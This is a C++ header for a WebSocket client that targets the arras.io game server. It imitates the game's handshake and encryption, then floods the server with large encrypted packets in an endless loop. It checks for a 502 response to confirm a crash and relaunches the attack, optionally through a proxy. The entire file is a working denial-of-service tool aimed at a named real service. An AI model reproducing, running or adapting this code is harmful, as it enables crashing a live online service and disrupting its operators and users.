#ifndef WITNESS_WITNESS_HPP
#define WITNESS_WITNESS_HPP

#include <asio.hpp>

#include <websocketpp/config/asio_client.hpp>
#include <websocketpp/client.hpp>

#include "utilities2.hpp"
#include "logger.hpp"
#include "uint8array.hpp"
#include "options.hpp"

#include <string>
#include <vector>

using websocketpp::lib::chrono::steady_clock;
using websocketpp::lib::chrono::system_clock;

typedef websocketpp::config::asio_tls_client asio_tls_client;

struct my_asio_client : public asio_tls_client {
    typedef logger<asio_tls_client::concurrency_type,
        websocketpp::log::alevel> alog_type;

    typedef logger<asio_tls_client::concurrency_type,
        websocketpp::log::elevel> elog_type;

    /*typedef my_con_msg_manager<
        asio_tls_client::message_type
    > con_msg_manager;*/

    static const bool enable_multithreading = true;
};

typedef websocketpp::client<my_asio_client> client;
typedef websocketpp::connection_hdl connection_hdl;

class witness {
public:
    witness()
        : m_packet_timer(m_io_context)
    {
        m_client.clear_access_channels(
            websocketpp::log::alevel::frame_header | websocketpp::log::alevel::control |
            websocketpp::log::alevel::frame_payload
        );

        m_client.clear_error_channels(websocketpp::log::elevel::all);

        m_client.init_asio(&m_io_context);

        m_client.set_tls_init_handler(
            [this](connection_hdl hdl) {
                auto ctx = std::make_shared<asio::ssl::context>(
                    asio::ssl::context::tls_client);

                ctx->set_options(
                      asio::ssl::context::default_workarounds
                    | asio::ssl::context::no_sslv2
                    | asio::ssl::context::no_sslv3
                    | asio::ssl::context::single_dh_use);

                ctx->set_default_verify_paths();
                ctx->set_verify_mode(asio::ssl::verify_peer);

                return ctx;
            }
        );

        m_client.set_open_handler(
            [this](connection_hdl hdl) {
                on_open(hdl);
            }
        );

        m_client.set_message_handler(
            [this](auto hdl, auto msg) {
                on_message(hdl, msg);
            }
        );

        m_client.set_close_handler(
            [this](connection_hdl hdl) {
                on_close(hdl);
            }
        );

        m_client.set_fail_handler(
            [this](connection_hdl hdl) {
                on_fail(hdl);
            }
        );
    }

    ~witness() {}

    void on_open(connection_hdl hdl) {
        m_connection_hdl = hdl;
        m_socket_open = steady_clock::now();
        this->hello();
    }

    void on_message(connection_hdl hdl, client::message_ptr msg) {
        std::string buffer = msg->get_payload();

        if (buffer.length() == 96) {
            logger("got crypto, sending response");
            handshake(buffer);
        } else {
            std::lock_guard lock(m_net_lock);
            ++m_sc_counter;
        }
    }

    void on_close(connection_hdl hdl) {
        m_socket_close = steady_clock::now();
        m_attack_time = m_socket_close - m_attack_start;

        logger(
            "Closure, connection lasted for " + std::to_string(
                (m_socket_close -
                    m_socket_open).count() / 1000000000ull) + "s"
            + " and i sent " + std::to_string(m_packets_sent) +
            " packets"
        );

        m_packets_sent = 0;
        m_sc_counter = 0;
        m_cs_counter = 0;

        m_packet_timer.cancel();

        m_client.set_timer(1000,
            [this](asio::error_code ec) {
                launch_attack();
            }
        );
    }

    void on_fail(connection_hdl hdl) {
        logger("pinging server...");

        websocketpp::lib::error_code ec;
        auto websocket = m_client.get_connection(m_target, ec);

        if (!websocket) {
            throw std::invalid_argument(
                "connection creation failed: " +
                ec.message()
            );
        }

        m_client.connect(websocket);
        m_ping_start = steady_clock::now();

        websocket->set_open_handler([this](connection_hdl hdl) {
            m_ping_end = steady_clock::now();
            logger("ping ended, server is up");
    
            auto websocket = m_client.get_con_from_hdl(hdl);

            websocket->close(
                websocketpp::close::status::no_status, ""
            );
        });

        websocket->set_fail_handler([this](connection_hdl hdl) {
            m_ping_end = steady_clock::now();

            auto websocket = m_client.get_con_from_hdl(hdl);
            int http_code = websocket->get_response_code();

            if (http_code == 502) {
                logger("ping ended, server crashed");
                on_server_crash();
            } else {
                logger("ping ended, server is up");
            }
        });
    }

    void on_server_crash() {
        m_server_crash = steady_clock::now();

        if (!m_noloop) {
            m_client.set_timer(1000,
                [this](asio::error_code ec) {
                    launch_attack();
                }
            );
        }
    }

    void launch_attack() {
        if (m_target.empty()) {
            throw std::invalid_argument(
                "i did not have a target yet"
            );
        }

        websocketpp::lib::error_code ec;
        auto websocket = m_client.get_connection(m_target, ec);

        if (!websocket) {
            throw std::invalid_argument(
                "connection creation failed: " +
                ec.message()
            );
        }

        websocket->replace_header("Accept-Encoding",
            "gzip, deflate, br, zstd");
        websocket->replace_header("Origin", "arras.io");

        websocket->add_subprotocol(
            "arras.io#v1.4+sls+et0");
        websocket->add_subprotocol("arras.io");

        if (!m_proxy.empty()) {
            websocket->set_proxy(m_proxy);
        }

        m_client.connect(websocket);
        m_attack_start = steady_clock::now();
    }

    void launch_strikes() {
        m_packet_timer.expires_after(websocketpp::lib::chrono::seconds(0));
        m_packet_timer.async_wait([this](const asio::error_code& ec) {
            if (ec) {
                logger("launch_strike error: " + ec.message());
                return;
            }
            try {
                protocol_send<32004ull>(uint8array);
                std::lock_guard lock(m_stats_lock);
                ++m_packets_sent;
            } catch (...) {
            }
            launch_strikes();
        });
    }

    template <size_t length>
    void protocol_send(const std::array<uint8_t, length>& input) {
        static_assert(length <= 65529);
        static thread_local ut::buffer<65535>
            send_buffer;
        send_buffer.clear();

        const auto nonce8
            = ut::counter_nonce(m_cs_counter);
        const auto nonce12
            = ut::chacha_nonce(nonce8);

        ut::chacha20(send_buffer, m_key, nonce12,
            input.data(), input.size());

        const auto tag32 = ut::sha256(
            send_buffer, m_key, nonce8);

        send_buffer.append(tag32.data(), 6);

        m_client.send(m_connection_hdl,
            send_buffer.data.data(),
            send_buffer.size(),
            websocketpp::frame::opcode::binary
        );

        std::lock_guard lock(m_net_lock);
        ++m_cs_counter;
    }

    void hello() {
        uint8_t data[] = { 0x00, 0x01, 0x00, 0x01,
            0x73, 0x35, 0xAE, 0xB8,
            0x7E, 0xD6, 0xAB, 0x74
        };

        m_client.send(m_connection_hdl, data, 12,
            websocketpp::frame::opcode::binary
        );

        logger("did send hello!");
    }

    void handshake(const std::string& buffer) {
        std::array<uint8_t, 32> header;

        memcpy(&header[0], buffer.data(), 32);

        m_scalar = ut::random_bytes<32>();

        m_scalar[0] &= 248;
        m_scalar[31] &= 127;
        m_scalar[31] |= 64;

        BN_CTX* ctx = BN_CTX_new();

        m_pk = ut::x25519_base(m_scalar, ctx);

        m_key = ut::bigint2arr(
            ut::x25519(m_scalar, header, ctx));

        BN_CTX_free(ctx);

        m_client.send(m_connection_hdl, m_pk.data(),
            32, websocketpp::frame::opcode::binary
        );

        launch_strikes();
        logger("did send response!");
    }

    void async_loop(int thread_count) {
        for (int i = 0; i < thread_count; i++) {
            m_thread_array.emplace_back([this]() {
                m_io_context.run();
            });
        }
    }

    void async_wait() {
        for (auto& t: m_thread_array) {
            t.join();
        }
    }

    void leave_target() {
        m_io_context.stop();
    }

private:
    void log_stats(const std::string& log_file, const std::string& json_file) {
        using namespace websocketpp::lib::chrono;

        if (!log_file.empty()) {
            std::ofstream out(log_file);

            if (out) {
                
            }
        }

        if (!json_file.empty()) {
            std::ofstream out(json_file);

            if (out) {
                
            }
        }
    }

public:
    void set_options(const options& opts) {
        set_target(opts.m_target);

        if (!opts.m_proxy.empty()) {
            set_proxy(opts.m_proxy);
        }

        m_interv_fire = opts.m_interv_fire;

        m_cx = opts.m_cx;
        m_noloop = opts.m_noloop;
    }

    void set_target(const std::string& target) {
        m_target = target;
    }

    void set_proxy(const std::string& proxy) {
        websocketpp::uri url(proxy);

        if (!url.get_valid() || url.get_scheme() != "http") {
            throw std::invalid_argument(
                "i got an invalid proxy or non-http"
            );
        }

        m_proxy = proxy;
    }

    void logger(const std::string& message) {
        m_client.get_alog().write(websocketpp::log::alevel::app,
            message
        );
    }

private:
    std::mutex                 m_net_lock;

    size_t                     m_sc_counter;
    size_t                     m_cs_counter;

    std::array<uint8_t, 32>    m_scalar;
    std::array<uint8_t, 32>    m_pk;
    std::array<uint8_t, 32>    m_key;

    std::string                m_target;
    std::string                m_proxy;
    bool                       m_noloop;
    bool                       m_cx;
    unsigned int               m_interv_fire;

    std::mutex                 m_stats_lock;

    uint32_t                   m_connect_retries;
    uint32_t                   m_packets_sent;
    steady_clock::time_point   m_ping_start;
    steady_clock::time_point   m_ping_end;
    steady_clock::time_point   m_attack_start;
    steady_clock::time_point   m_socket_open;
    steady_clock::time_point   m_socket_close;
    steady_clock::time_point   m_server_crash;
    steady_clock::duration     m_attack_time;

    std::vector<std::thread>   m_thread_array;

    asio::io_context           m_io_context;
    asio::steady_timer         m_packet_timer;
    client                     m_client;
    connection_hdl             m_connection_hdl;
};

#endif // WITNESS_WITNESS_HPP
